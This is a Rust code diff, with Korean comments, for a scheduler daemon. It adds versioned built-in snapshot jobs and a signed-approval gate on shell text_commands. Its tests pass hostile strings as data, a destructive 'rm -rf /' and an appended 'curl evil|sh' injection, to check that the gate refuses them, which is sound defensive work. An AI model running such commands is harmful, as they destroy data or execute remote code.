@@ -87,6 +87,134 @@ pub fn schedule_path() -> PathBuf {
     cys::pack::pack_dir().join("schedule.json")
 }
 
+/// ★B2-1(W3): built-in 잡 정의 버전. 잡 내용이 바뀌면 올린다 — 부트 ensure 가 구버전 항목을 갱신하는 기준.
+const BUILTIN_JOBS_VERSION: u64 = 1;
+
+/// built-in(phoenix 인프라) 잡 정의 — 팩 schedule.json 배달이 아니라 코드가 소유한다(schedule.json 이 user-owned
+/// 로 전환돼 팩 강제갱신이 사용자 잡을 보존하므로, built-in 잡 진화는 이 코드가 담당). 각 항목에 `_builtin`/
+/// `_builtin_version` 마커를 달아 ensure 가 id 로 upsert·버전 대조한다(Job 의 미지 필드는 serde 가 무시).
+fn builtin_jobs() -> Vec<serde_json::Value> {
+    vec![
+        json!({
+            "id": "phoenix-snapshot-6h",
+            "every_minutes": 360,
+            "action": "push",
+            "to": "master",
+            "if_absent": "skip",
+            "text_command": "printf '[heartbeat] phoenix 세대 스냅샷 정기화(6h·P2-4) — 손상 치유 소스 최신화.\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" snapshot 2>&1 | tail -3",
+            "_builtin": "phoenix",
+            "_builtin_version": BUILTIN_JOBS_VERSION
+        }),
+        json!({
+            "id": "phoenix-drill-weekly",
+            "every_minutes": 10080,
+            "action": "push",
+            "to": "master",
+            "if_absent": "skip",
+            "text_command": "printf '[heartbeat] phoenix 주간 격리 드릴(원자성·중단내성 self-test·라이브 무접촉) — 실전이 첫 테스트인 상태 종료(축E E2).\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" self-test 2>&1 | tail -5",
+            "_builtin": "phoenix",
+            "_builtin_version": BUILTIN_JOBS_VERSION
+        }),
+    ]
+}
+
+/// built-in 잡을 jobs 배열에 idempotent upsert(순수 — 회귀 핀). id 로 대조:
+///   · 부재 → append(생성)
+///   · 존재 + built-in 마커(`_builtin=="phoenix"`) → 버전 상이 시 교체(갱신)·동버전 무접촉
+///   · 존재 + **마커 없음(사용자가 그 id 선점)** → ★codex W3: 교체 금지(사용자 잡 보존)·경고(conflicts 반환)
+/// 반환 (changed, conflicts) — conflicts=사용자가 reserved id 를 쓴 잡 id 목록(호출측 loud 경고).
+fn apply_builtin_jobs(jobs: &mut Vec<serde_json::Value>) -> (bool, Vec<String>) {
+    let mut changed = false;
+    let mut conflicts = Vec::new();
+    for bj in builtin_jobs() {
+        let id = match bj.get("id").and_then(|v| v.as_str()) {
+            Some(s) => s.to_string(),
+            None => continue,
+        };
+        let want_ver = bj.get("_builtin_version").and_then(|v| v.as_u64()).unwrap_or(0);
+        match jobs
+            .iter()
+            .position(|j| j.get("id").and_then(|v| v.as_str()) == Some(id.as_str()))
+        {
+            Some(pos) => {
+                // ★codex W3 major: built-in 마커(_builtin=="phoenix")가 있는 항목만 우리 소유 → 버전 갱신.
+                //   마커 없는 동명 항목은 사용자가 그 id 를 선점한 것 → 교체 금지+conflict 경고(user 잡 보존).
+                let is_ours =
+                    jobs[pos].get("_builtin").and_then(|v| v.as_str()) == Some("phoenix");
+                if !is_ours {
+                    conflicts.push(id);
+                    continue;
+                }
+                let cur_ver = jobs[pos].get("_builtin_version").and_then(|v| v.as_u64());
+                if cur_ver != Some(want_ver) {
+                    jobs[pos] = bj; // built-in 구버전 → 갱신
+                    changed = true;
+                }
+                // 존재+동버전 = 무접촉(중복 생성 0)
+            }
+            None => {
+                jobs.push(bj); // 부재 → 생성
+                changed = true;
+            }
+        }
+    }
+    (changed, conflicts)
+}
+
+/// ★B2-1(W3): 데몬 부트 시 built-in phoenix 잡을 schedule.json 에 idempotent 하게 보장한다. schedule.json 은
+/// user-owned(사용자 `cys schedule add` 잡 보존)이라 팩 배달로는 built-in 잡을 갱신할 수 없다 — 코드가 upsert 한다.
+/// 파일 부재=빈 골격 생성 · 손상(파싱 실패)=무접촉(load_jobs 의 격리 경로가 별도 처리 — 여기서 덮어써 사용자 잡을
+/// 잃지 않는다) · 변경 있을 때만 원자적 재기록(핫 리로드 torn read 회피).
+pub fn ensure_builtin_jobs() {
+    let path = schedule_path();
+    let mut root: serde_json::Value = match std::fs::read_to_string(&path) {
+        Ok(c) => match serde_json::from_str(&c) {
+            Ok(v) => v,
+            Err(e) => {
+                // 손상 — 무접촉(사용자 잡 보존 우선). load_jobs 가 격리+loud 신호를 낸다.
+                eprintln!("[cysd] ensure_builtin_jobs: schedule.json 파싱 실패({e}) — 무접촉(손상은 load_jobs 격리 소관)");
+                return;
+            }
+        },
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => json!({"jobs": []}),
+        Err(e) => {
+            eprintln!("[cysd] ensure_builtin_jobs: schedule.json 읽기 실패({e}) — 무접촉");
+            return;
+        }
+    };
+    if !root.is_object() {
+        eprintln!("[cysd] ensure_builtin_jobs: schedule.json 최상위가 object 아님 — 무접촉");
+        return;
+    }
+    // jobs 배열 확보(부재/비배열이면 빈 배열로 정규화 — 다른 키는 보존).
+    if !root.get("jobs").map(|j| j.is_array()).unwrap_or(false) {
+        root.as_object_mut()
+            .unwrap()
+            .insert("jobs".to_string(), json!([]));
+    }
+    let arr = root.get_mut("jobs").and_then(|j| j.as_array_mut()).unwrap();
+    let (changed, conflicts) = apply_builtin_jobs(arr);
+    for id in &conflicts {
+        eprintln!(
+            "[cysd] ensure_builtin_jobs: 사용자 잡이 예약 id '{id}' 를 선점 — built-in 갱신 skip(사용자 잡 보존). \
+             built-in 기능을 원하면 사용자 잡을 다른 id 로 옮기라."
+        );
+    }
+    if changed {
+        match serde_json::to_string_pretty(&root) {
+            Ok(s) => {
+                let tmp = path.with_extension("json.tmp");
+                if std::fs::write(&tmp, s).is_ok() && std::fs::rename(&tmp, &path).is_ok() {
+                    eprintln!("[cysd] ensure_builtin_jobs: built-in phoenix 잡 보장(생성/갱신) 완료");
+                } else {
+                    eprintln!("[cysd] ensure_builtin_jobs: schedule.json 원자쓰기 실패");
+                }
+            }
+            Err(e) => eprintln!("[cysd] ensure_builtin_jobs: 직렬화 실패({e})"),
+        }
+    }
+}
+
 fn state_path(daemon: &Daemon) -> PathBuf {
     state_dir(&daemon.socket_path).join("schedule_state.json")
 }
@@ -404,10 +532,44 @@ fn effective_close_ttl(job: &Job) -> Option<u64> {
     None
 }
 
+/// R-CLI-4: text_command 실행 前 게이트용 — 코드 소유 built-in 잡의 text_command와 정확히
+/// 일치하는가(순수·회귀 핀). built-in 문자열이 조금이라도 변조되면 false로 떨어진다.
+fn is_trusted_builtin_text_command(cmd: &str) -> bool {
+    builtin_jobs()
+        .iter()
+        .any(|j| j.get("text_command").and_then(|v| v.as_str()) == Some(cmd))
+}
+
+/// R-CLI-4: text_command는 데몬이 셸로 실행하므로(schedule.json 편집자 = 임의 셸 실행 벡터) 실행
+/// 前 게이트한다. ① 코드 소유 built-in 잡(팩·데몬 저작)의 text_command와 정확 일치 = 신뢰 허용.
+/// ② 그 외(사용자·외부 주입·변조된 built-in) = 서명된 승인 레코드(approval.rs) 필요 — 부재 시
+/// fail-closed 거부. 서명 시크릿 없이는 레코드 위조 불가라 무게이트 임의 셸 실행을 봉인한다.
+fn text_command_allowed(cmd: &str) -> Result<(), String> {
+    if is_trusted_builtin_text_command(cmd) {
+        return Ok(());
+    }
+    let Some(secret) = crate::approval::signing_secret() else {
+        return Err("text_command 승인 시크릿 부재 — 미승인 셸 실행 거부".into());
+    };
+    let records = crate::approval::load_records();
+    let cwd = std::env::current_dir()
+        .ok()
+        .map(|p| p.to_string_lossy().to_string());
+    if crate::approval::best_match(&records, &secret, cmd, cwd.as_deref(), &[]).is_some() {
+        Ok(())
+    } else {
+        Err(format!(
+            "미승인 text_command — built-in 아님·서명 승인 없음(임의 셸 실행 차단): {cmd}"
+        ))
+    }
+}
+
 /// text_command를 셸로 실행해 stdout(trim)을 반환한다 (push 텍스트 산출).
 /// 결정론 환원: 진행% 같은 도구 출력을 데몬이 직접 만들어 master 앞에 놓는다.
 /// 30초 타임아웃·빈 출력·비정상 종료는 에러 — 잘못된 보고가 무음 전달되지 않는다.
 async fn run_text_command(cmd: &str) -> Result<String, String> {
+    // R-CLI-4: 무게이트 셸 실행 차단 — built-in 신뢰 또는 서명 승인만 통과.
+    text_command_allowed(cmd)?;
     // RC-11: OS별 셸 — Windows는 sh 부재라 heartbeat/report text_command job이 전부 실패했다.
     // fire_command와 동일하게 command_shell()((cmd,/C) on windows) 사용으로 통일.
     let (sh, flag) = command_shell();
@@ -653,6 +815,101 @@ mod tests {
         Daemon::new(dir.join("cysd.sock"))
     }
 
+    // ★B2-1(W3): built-in 잡 부트 ensure idempotency — 부재 생성·재실행 무접촉(중복 0)·구버전 갱신·사용자 잡 보존.
+    #[test]
+    fn builtin_jobs_ensure_idempotent_and_versioned() {
+        // 사용자 잡 1개로 시작(cys schedule add 시뮬).
+        let mut jobs: Vec<serde_json::Value> = vec![json!({
+            "id": "user-custom-job", "every_minutes": 30, "action": "push", "to": "master"
+        })];
+
+        // 1차: built-in 2개 생성 → changed=true.
+        let (c1, conf1) = apply_builtin_jobs(&mut jobs);
+        assert!(c1, "1차 ensure 는 built-in 잡을 생성해야 한다");
+        assert!(conf1.is_empty(), "conflict 없음(예약 id 미선점)");
+        let ids: Vec<&str> = jobs.iter().filter_map(|j| j["id"].as_str()).collect();
+        assert!(ids.contains(&"phoenix-snapshot-6h") && ids.contains(&"phoenix-drill-weekly"));
+        assert!(ids.contains(&"user-custom-job"), "사용자 잡은 보존돼야 한다");
+        assert_eq!(jobs.len(), 3, "사용자1 + built-in2");
+        // 주기 정합(typed): snapshot=6h(360), drill=7일(10080).
+        let period = |id: &str| {
+            jobs.iter()
+                .find(|j| j["id"].as_str() == Some(id))
+                .and_then(|j| j["every_minutes"].as_u64())
+        };
+        assert_eq!(period("phoenix-snapshot-6h"), Some(360), "snapshot 6h");
+        assert_eq!(period("phoenix-drill-weekly"), Some(10080), "drill 7일");
+
+        // 2차: 동버전 재실행 → 무접촉(changed=false·중복 0).
+        let (c2, _) = apply_builtin_jobs(&mut jobs);
+        assert!(!c2, "동버전 재실행은 무접촉(변경 없음)이어야 한다");
+        let snap_count = jobs
+            .iter()
+            .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
+            .count();
+        assert_eq!(snap_count, 1, "재실행에도 중복 생성 0");
+        assert_eq!(jobs.len(), 3, "중복 없이 3개 유지");
+
+        // 3차: 구버전(마커=0) 항목이 있으면 갱신(교체) → changed=true, 여전히 중복 0.
+        for j in jobs.iter_mut() {
+            if j["id"].as_str() == Some("phoenix-snapshot-6h") {
+                j["_builtin_version"] = json!(0); // 구버전 강제
+                j["every_minutes"] = json!(99999); // 사용자가 못 고치는 드리프트 시뮬
+            }
+        }
+        let (c3, _) = apply_builtin_jobs(&mut jobs);
+        assert!(c3, "구버전 항목은 갱신돼야 한다");
+        let refreshed = jobs
+            .iter()
+            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
+            .unwrap();
+        assert_eq!(
+            refreshed["_builtin_version"].as_u64(),
+            Some(BUILTIN_JOBS_VERSION),
+            "버전업 갱신"
+        );
+        assert_eq!(
+            refreshed["every_minutes"].as_u64(),
+            Some(360),
+            "갱신은 코드 정의(360)로 복원 — 드리프트 치유"
+        );
+        assert_eq!(
+            jobs.iter()
+                .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
+                .count(),
+            1,
+            "갱신 후에도 중복 0"
+        );
+    }
+
+    // ★codex W3 major: 사용자가 예약 id(phoenix-snapshot-6h)를 마커 없이 선점하면 built-in ensure 가
+    //   교체하지 않고 보존+conflict 경고해야 한다(B2-1 사용자 잡 보존 계약).
+    #[test]
+    fn builtin_ensure_preserves_user_job_on_reserved_id() {
+        let mut jobs: Vec<serde_json::Value> = vec![json!({
+            "id": "phoenix-snapshot-6h",           // 사용자가 예약 id 선점(_builtin 마커 없음)
+            "every_minutes": 5, "action": "push", "to": "master", "text": "USER OWN SNAPSHOT"
+        })];
+        let (changed, conflicts) = apply_builtin_jobs(&mut jobs);
+        // snapshot id 는 conflict 로 보존, drill 은 신규 생성.
+        assert!(conflicts.contains(&"phoenix-snapshot-6h".to_string()), "예약 id 충돌 보고");
+        let snap = jobs
+            .iter()
+            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
+            .unwrap();
+        assert_eq!(snap["text"].as_str(), Some("USER OWN SNAPSHOT"), "사용자 잡 내용 보존(교체 금지)");
+        assert_eq!(snap["every_minutes"].as_u64(), Some(5), "사용자 주기 보존");
+        assert!(snap.get("_builtin").is_none(), "사용자 잡에 built-in 마커 미주입");
+        assert_eq!(
+            jobs.iter().filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h")).count(),
+            1,
+            "충돌 id 중복 생성 0"
+        );
+        // drill 은 마커 없는 선점이 없으므로 정상 생성(changed=true).
+        assert!(changed, "drill 신규 생성으로 changed");
+        assert!(jobs.iter().any(|j| j["id"].as_str() == Some("phoenix-drill-weekly")));
+    }
+
     #[test]
     fn run_now_is_frozen_while_paused() {
         // 회귀 가드 (T4-15 kill-switch 비대칭 차단): pause 중이면 run_now도 발화하지 않아야 한다.
@@ -887,5 +1144,29 @@ mod tests {
             .expect("command_shell() must select a shell present on this platform");
         assert!(out.status.success());
         assert!(String::from_utf8_lossy(&out.stdout).contains("cys"));
+    }
+
+    // R-CLI-4: 코드 소유 built-in text_command만 무승인 신뢰, 임의·변조 명령은 승인 게이트 대상.
+    #[test]
+    fn builtin_text_commands_are_trusted_others_gated() {
+        for j in builtin_jobs() {
+            if let Some(cmd) = j.get("text_command").and_then(|v| v.as_str()) {
+                assert!(
+                    is_trusted_builtin_text_command(cmd),
+                    "built-in text_command이 신뢰되지 않음: {cmd}"
+                );
+            }
+        }
+        // 임의 명령은 built-in 아님 → 승인 게이트 대상.
+        assert!(
+            !is_trusted_builtin_text_command("rm -rf / --no-preserve-root"),
+            "임의 명령이 built-in으로 신뢰됨"
+        );
+        // built-in을 변조(뒤에 명령 추가)하면 더는 신뢰 안 함.
+        let base = builtin_jobs()[0]["text_command"].as_str().unwrap().to_string();
+        assert!(
+            !is_trusted_builtin_text_command(&format!("{base} ; curl evil|sh")),
+            "변조된 built-in이 신뢰됨"
+        );
     }
 }
